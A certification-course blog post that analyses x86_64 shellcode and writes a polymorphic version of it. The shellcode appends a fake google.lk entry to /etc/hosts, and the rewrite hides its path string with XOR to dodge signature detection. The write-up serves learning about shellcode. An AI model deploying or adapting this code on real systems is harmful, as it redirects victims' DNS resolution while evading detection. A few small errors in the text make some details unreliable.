Title: SLAE64 - Assignment 6.2
Date: 2022-07-07T06:40:27.000Z


## Disclaimer


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

[https://www.pentesteracademy.com/course?id=7](https://www.pentesteracademy.com/course?id=7)

Student ID: PA-30398

## Foreword

I chose the following shellcode samples:

<ol><li>[Read /etc/passwd - 82 bytes](https://shell-storm.org/shellcode/files/shellcode-878.php)
- [Add map in /etc/hosts file - 110 bytes](https://shell-storm.org/shellcode/files/shellcode-896.php)
- [Reads data from /etc/passwd to /tmp/outfile - 118 bytes](https://shell-storm.org/shellcode/files/shellcode-867.php)

In this part I'll create a polymorphic version of the second shellcode.

## Source Code

The files for this part of the assignment are the following:

- [original.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/2/original.nasm), the original shellcode
- [polymorphic.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae64/assignment/6/2/polymorphic.nasm), which is the polymorphic version I've written

## Analysis

The second shellcode simply adds a new entry to the file `/etc/hosts`. In this case, it adds the following mapping:`127.1.1.1 google.lk`.

Below is an analysis of the interested shellcode with some comments describing its logic.

```nasm
; Title: Add map in /etc/hosts file - 110 bytes
; Date: 2014-10-29
; Platform: linux/x86_64
; Website: http://osandamalith.wordpress.com
; Author: Osanda Malith Jayathissa (@OsandaMalith)

global _start

section .text

_start:

    ; set RAX to 2 (syscall open)
    xor rax, rax 
    add rax, 2

    ; clear RDI and RSI
    xor rdi, rdi
    xor rsi, rsi
    
    ; 1st argument of open: pointer to the file to open
    ; in this case: /etc///////hosts
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp

    ; 2nd argument of open: flags to use when opening
    ; the file
    ; in this case: 0x401 (O_WRONLY | O_APPEND)
    xor rsi, rsi
    add si, 0x401

    ; invoke open syscall
    syscall

    ; save the file descriptor of the opened file in
    ; the register RDI
    xchg rax, rdi

    ; set RAX to 1: syscall write
    xor rax, rax

    ; invoke the syscall write
    add rax, 1

    ; use the JMP-POP-CALL syscall to get the address
    ; of the new host entry into RSI
    jmp data

write:

    pop rsi

    ; 3rd argument of write syscall, number of bytes
    ; to write 
    mov dl, 19

    ; invoke syscall write
    syscall

    ; invoke syscall close
    xor rax, rax
    add rax, 3
    syscall

    ; invoke syscall exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall 

data:

    call write
    text db '127.1.1.1 google.lk'
```

<figcaption class="figure-caption">Analysis of the original shellcode</figcaption>

To recapitulate, the shellcode performs the following operations:

- using the syscall `open` to open the file `/etc/hosts` in write-append mode
- using the syscall `write` to write a new entry in the previous file
- using the syscall `close`
- using the syscall `exit` to terminate the execution of the program

During the analysis of the shellcode, I discovered that you can use some python instruction to get the values of the flags used by the syscall `open`.

It's quite convenient since they may differ from online references based on the architecture of your computer.

```py
import os

open_flags = [x for x in exports if x.startswith("O_")]

[print(f"[+] {key:<15} -> {hex(getattr(os,key))}") for key in open_flags]
# [+] O_ACCMODE       -> 0x3
# [+] O_APPEND        -> 0x400
# [+] O_ASYNC         -> 0x2000
# [+] O_CLOEXEC       -> 0x80000
# [+] O_CREAT         -> 0x40
# [+] O_DIRECT        -> 0x4000
# [+] O_DIRECTORY     -> 0x10000
# [+] O_DSYNC         -> 0x1000
# [+] O_EXCL          -> 0x80
# [+] O_LARGEFILE     -> 0x0
# [+] O_NDELAY        -> 0x800
# [+] O_NOATIME       -> 0x40000
# [+] O_NOCTTY        -> 0x100
# [+] O_NOFOLLOW      -> 0x20000
# [+] O_NONBLOCK      -> 0x800
# [+] O_PATH          -> 0x200000
# [+] O_RDONLY        -> 0x0
# [+] O_RDWR          -> 0x2
# [+] O_RSYNC         -> 0x101000
# [+] O_SYNC          -> 0x101000
# [+] O_TMPFILE       -> 0x410000
# [+] O_TRUNC         -> 0x200
# [+] O_WRONLY        -> 0x1
```

<figcaption class="figure-caption">Python script to list open flags</figcaption>

## Polymorphism

The shellcode is made up of the following routines:

- `OpenFile`, for opening the file `/etc/hosts`
- `WriteFile`, for writing the host entry to the file
- `RetrieveEntryPointer`, which allows me to retrieve the address of the host entry through the `JMP-CALL-POP` technique
- `CloseFile`, which closes the file descriptor of `/etc/hosts`
- `Exit`, which gracefully terminates the execution of the shellcode

### Opening the file

Follows the assembly code for the first routine:

```nasm
global _start

section .text

_start:

OpenFile:
   
    ; clear RAX for later usage
    xor eax, eax

    ; 2nd argument of open: flags to use when opening
    ; the file
    ; in this case: 0x401 (O_WRONLY | O_APPEND)
    push rax
    push rax
    pop rsi
    mov si, 0x401

    ; set RAX to 2 (syscall open)
    add rax, 2
    
    ; string "ts" of "/etc/hosts"
    push WORD 0x7374

    ; string "/etc/hos" encrypted through XOR
    mov rbx, 0x3b944e4c5e433bbe
    mov rcx, 0x48fb26633d375e91
    xor rbx, rcx
    push rbx

    ; 1st argument of open: pointer to the file to open
    ; file "/etc/hosts" in this case
    mov rdi, rsp

    ; invoke open syscall
    syscall
```

<figcaption class="figure-caption">Opening `/etc/hosts`</figcaption>

Compared to the original shellcode, the order of the instructions is slightly different, and some of the registers used are different.

Doing so, the resulting bytes after assembling the program are going to be different.

In addition, instead of keeping the string `/etc/hosts` in clear-text, I chose to obfuscate it by `XOR`-ing it with a random key.

### Writing the host entry

The snippet below contains the next two routines, which appends the `google.lk` entry to the file `/etc/hosts`.

```nasm
WriteFile:

    ; save the file descriptor of the opened file in
    ; the register RDI
    push rax
    pop rdi

    ; set RAX to 1 (syscall write)
    xor eax, eax

    ; clear RDX (for later use) by means of
    ; sign-extension of RAX
    cdq

    ; 3rd argument of write syscall, number of bytes
    ; to write 
    add dl, 19

    ; invoke the syscall write
    inc eax

    ; use the JMP-POP-CALL syscall to get the address
    ; of the new host entry into RSI
    jmp Data

RetrieveEntryPointer:

    ; get the address of the host entry
    mov rsi, QWORD [rsp]

    ; invoke syscall write
    syscall
    
; Some routines are omitted for clarity
    
Data:

    call RetrieveEntryPointer
    text db '127.1.1.1 google.lk'
```

<figcaption class="figure-caption">Append the host entry to `/etc/hosts`</figcaption>

Instead of using the instruction `XCHG` I chose the simple `PUSH` and `POP` method to save the file descriptor in the `RDI` register .

After that, I used `CDQ` (Convert Double to Quad) to clear the `RDX` register. Rather than using the `ADD` instruction (to increase `RAX`) I simply used `INC`.

Finally, I changed a bit the `JMP-POP-CALL` technique. Instead of the `CALL` instruction I used `MOV`. After all, if there are no other values on the stack, then you don't really have to use `POP`.

### Cleaning up

The last two routines close the file descriptor of the file `/etc/hosts`, opened previously with `sys_open` and terminate the execution of the shellcode with `sys_exit`.

```nasm
CloseFile:

    ; invoke syscall close
    xor eax, eax
    mov al, 3
    syscall

Exit:

    ; invoke syscall exit
    xor eax, eax
    add al, 195
    not eax
    syscall 
```

<figcaption class="figure-caption">Cleaning routines</figcaption>

If you care about the size of your shellcode, then you could also remove them to save about 14 bytes.

In the end, the polymorphic code occpies 102 bytes, which is 8 bytes less than the original code.

